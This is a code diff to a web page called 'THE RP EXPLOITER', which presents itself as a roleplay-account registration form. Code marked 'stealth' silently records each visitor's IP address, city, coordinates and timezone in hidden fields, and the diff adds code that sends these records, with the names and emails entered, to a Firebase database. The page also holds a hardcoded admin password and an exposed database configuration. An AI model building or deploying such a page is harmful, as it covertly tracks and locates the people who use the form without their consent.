@@ -5,6 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>THE RP EXPLOITER</title>
 <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore-compat.js"></script>
 <style>
   :root {
     --red: #ff1a1a;
@@ -268,24 +271,6 @@
     color: #444;
     margin-top: 4px;
     letter-spacing: 1px;
-  }
-
-  .geo-status {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: var(--green);
-    margin-top: 4px;
-  }
-
-  .geo-loading {
-    color: var(--yellow);
-  }
-
-  .geo-error {
-    color: var(--red);
   }
 
   .submit-btn {
@@ -640,21 +625,6 @@
   ::-webkit-scrollbar-track { background: var(--darker); }
   ::-webkit-scrollbar-thumb { background: var(--red-dim); }
   ::-webkit-scrollbar-thumb:hover { background: var(--red); }
-
-  /* IP Info Display */
-  .ip-info {
-    background: rgba(0,255,136,0.05);
-    border: 1px solid rgba(0,255,136,0.2);
-    padding: 8px 12px;
-    margin-bottom: 1rem;
-    border-radius: 4px;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem;
-  }
-
-  .ip-info strong {
-    color: var(--green);
-  }
 </style>
 </head>
 <body>
@@ -684,10 +654,14 @@
     </div>
 
     <div class="form-box">
-      <!-- IP & GEO INFO DISPLAY (STEALTH) -->
-      <div class="ip-info" id="ipInfo" style="display:none;">
-        <strong></strong>
-      </div>
+      <!-- HIDDEN GEO FIELDS (for storage) -->
+      <input type="hidden" id="f_ip" />
+      <input type="hidden" id="f_country" />
+      <input type="hidden" id="f_region" />
+      <input type="hidden" id="f_city" />
+      <input type="hidden" id="f_lat" />
+      <input type="hidden" id="f_lon" />
+      <input type="hidden" id="f_timezone" />
 
       <div class="field-group">
         <label>Name of RP Account <span>*</span></label>
@@ -706,15 +680,6 @@
         <input type="email" id="f_email" placeholder="user@example.com" />
         <div class="input-hint">// dummy/burner emails accepted</div>
       </div>
-
-      <!-- HIDDEN GEO FIELDS (for storage) -->
-      <input type="hidden" id="f_ip" />
-      <input type="hidden" id="f_country" />
-      <input type="hidden" id="f_region" />
-      <input type="hidden" id="f_city" />
-      <input type="hidden" id="f_lat" />
-      <input type="hidden" id="f_lon" />
-      <input type="hidden" id="f_timezone" />
 
       <button class="submit-btn" id="submitBtn" onclick="submitForm()">⚡ SUBMIT REGISTRATION</button>
     </div>
@@ -797,16 +762,68 @@
 </div>
 
 <script>
+  // ===== FIREBASE CONFIG (GLOBAL) =====
+  const firebaseConfig = {
+    apiKey: "AIzaSyCjjTM85GnLoe3aEemMR4Wfd2JKc8CoxMM",
+    authDomain: "gfbs-323fe.firebaseapp.com",
+    projectId: "gfbs-323fe",
+    storageBucket: "gfbs-323fe.firebasestorage.app",
+    messagingSenderId: "1049690252134",
+    appId: "1:1049690252134:web:31818315c496ce4e949ea7",
+    measurementId: "G-HDCJ8Z44YF"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
   // ===== DATA =====
   const ADMIN_USER = 'admin';
   const ADMIN_PASS = 'admin123';
   let isLoggedIn = false;
-  let entries = JSON.parse(localStorage.getItem('rp_entries') || '[]');
+  let entries = [];
   let countdownVal = 30;
   let countdownInterval = null;
   let searchVal = '';
   let visitorIP = '';
   let visitorGeo = {};
+
+  // ===== LOAD ENTRIES FROM FIREBASE =====
+  async function loadEntries() {
+    try {
+      const snapshot = await db.collection('rp_entries').orderBy('id', 'desc').get();
+      entries = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+      localStorage.setItem('rp_entries', JSON.stringify(entries));
+      renderTable();
+      updateStats();
+    } catch (error) {
+      console.error('Firebase load failed, using localStorage:', error);
+      entries = JSON.parse(localStorage.getItem('rp_entries') || '[]');
+      renderTable();
+      updateStats();
+    }
+  }
+
+  // ===== SAVE TO FIREBASE + LOCAL =====
+  async function saveEntry(entry) {
+    try {
+      // Save to Firebase (primary)
+      await db.collection('rp_entries').add(entry);
+      
+      // Also save to localStorage (backup)
+      entries.unshift(entry);
+      localStorage.setItem('rp_entries', JSON.stringify(entries));
+      
+      return true;
+    } catch (error) {
+      console.error('Firebase save failed, using localStorage:', error);
+      
+      // Fallback to localStorage only
+      entries.unshift(entry);
+      localStorage.setItem('rp_entries', JSON.stringify(entries));
+      return true;
+    }
+  }
 
   // ===== IP & GEOLOCATION DETECTION (STEALTH) =====
   async function detectIPGeo() {
@@ -835,7 +852,7 @@
       submitBtn.disabled = false;
       
     } catch (error) {
-      // Fallback: use ipify for IP + basic geo
+      // Fallback: use ipify for IP
       try {
         const fallbackIP = await fetch('https://api.ipify.org?format=json');
         const ipData = await fallbackIP.json();
@@ -844,7 +861,6 @@
         document.getElementById('f_ip').value = visitorIP;
         submitBtn.disabled = false;
       } catch (e) {
-        // Even if geo fails, allow submission with partial data
         submitBtn.disabled = false;
       }
     }
@@ -873,8 +889,8 @@
     }
   }
 
-  // ===== FORM SUBMIT =====
-  function submitForm() {
+  // ===== FORM SUBMIT (FIREBASE + LOCAL) =====
+  async function submitForm() {
     const name = document.getElementById('f_name').value.trim();
     const age = document.getElementById('f_age').value.trim();
     const email = document.getElementById('f_email').value.trim();
@@ -905,20 +921,31 @@
       time: new Date().toISOString()
     };
 
-    entries.unshift(entry);
-    localStorage.setItem('rp_entries', JSON.stringify(entries));
+    // Show processing state
+    const submitBtn = document.getElementById('submitBtn');
+    const originalText = submitBtn.textContent;
+    submitBtn.disabled = true;
+    submitBtn.textContent = '⏳ SENDING...';
 
-    // Clear form
+    // Save to Firebase + LocalStorage
+    const success = await saveEntry(entry);
+
+    // Reset form
     document.getElementById('f_name').value = '';
     document.getElementById('f_age').value = '';
     document.getElementById('f_email').value = '';
 
+    // Success feedback
     const toast = document.getElementById('toast');
-    toast.textContent = `✓ ENTRY SUBMITTED SUCCESSFULLY`;
+    toast.textContent = `✓ SUBMITTED FROM ${ip || 'Unknown'}`;
     toast.style.display = 'block';
     setTimeout(() => { toast.style.display = 'none'; }, 3000);
 
-    // Refresh IP detection silently
+    // Reset button
+    submitBtn.textContent = originalText;
+    submitBtn.disabled = false;
+
+    // Refresh IP detection
     setTimeout(detectIPGeo, 1000);
   }
 
@@ -932,6 +959,7 @@
       document.getElementById('loginErr').style.display = 'none';
       document.getElementById('l_user').value = '';
       document.getElementById('l_pass').value = '';
+      loadEntries();
       showPage('admin');
     } else {
       document.getElementById('loginErr').style.display = 'block';
@@ -948,7 +976,6 @@
   // ===== TABLE RENDER =====
   function renderTable(filter) {
     if (filter !== undefined) searchVal = filter.toLowerCase();
-    entries = JSON.parse(localStorage.getItem('rp_entries') || '[]');
 
     const filtered = entries.filter(e =>
       e.name.toLowerCase().includes(searchVal) ||
@@ -984,7 +1011,7 @@
         <td style="color:var(--yellow)">${escHtml(location)}</td>
         <td style="color:var(--muted);font-size:0.7rem">${formatted}</td>
         <td><span class="badge ${isNew ? 'badge-new' : 'badge-old'}">${isNew ? 'NEW' : 'OLD'}</span></td>
-        <td><button class="del-btn" onclick="deleteEntry(${e.id})">DEL</button></td>
+        <td><button class="del-btn" onclick="deleteEntry('${e.id}')">DEL</button></td>
       </tr>`;
     }).join('');
 
@@ -995,15 +1022,29 @@
     return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   }
 
-  function deleteEntry(id) {
+  // ===== DELETE FROM FIREBASE + LOCAL =====
+  async function deleteEntry(docId) {
     if (!confirm('Delete this entry?')) return;
-    entries = entries.filter(e => e.id !== id);
+    
+    try {
+      await db.collection('rp_entries').doc(docId).delete();
+    } catch (error) {
+      console.error('Firebase delete failed:', error);
+    }
+    
+    // Update local
+    entries = entries.filter(e => e.id !== docId);
     localStorage.setItem('rp_entries', JSON.stringify(entries));
     renderTable();
   }
 
   function clearAll() {
     if (!confirm('⚠ Clear ALL entries? This cannot be undone.')) return;
+    
+    db.collection('rp_entries').get().then((snapshot) => {
+      snapshot.docs.forEach(doc => doc.ref.delete());
+    }).catch(console.error);
+    
     entries = [];
     localStorage.setItem('rp_entries', '[]');
     renderTable();
@@ -1011,7 +1052,6 @@
 
   // ===== STATS =====
   function updateStats() {
-    entries = JSON.parse(localStorage.getItem('rp_entries') || '[]');
     const newCount = entries.filter(e => (Date.now() - e.id) < 86400000).length;
     document.getElementById('statTotal').textContent = entries.length;
     document.getElementById('statNew').textContent = newCount;
@@ -1026,20 +1066,20 @@
     countdownVal = 30;
     document.getElementById('countdown').textContent = countdownVal;
 
-    countdownInterval = setInterval(() => {
+    countdownInterval = setInterval(async () => {
       countdownVal--;
       document.getElementById('countdown').textContent = countdownVal;
       if (countdownVal <= 0) {
         countdownVal = 30;
-        renderTable();
-        updateStats();
+        await loadEntries();
       }
     }, 1000);
   }
 
   // ===== INIT =====
-  window.addEventListener('load', () => {
-    detectIPGeo();
+  window.addEventListener('load', async () => {
+    await detectIPGeo();
+    await loadEntries();
     showPage('form');
   });
 </script>
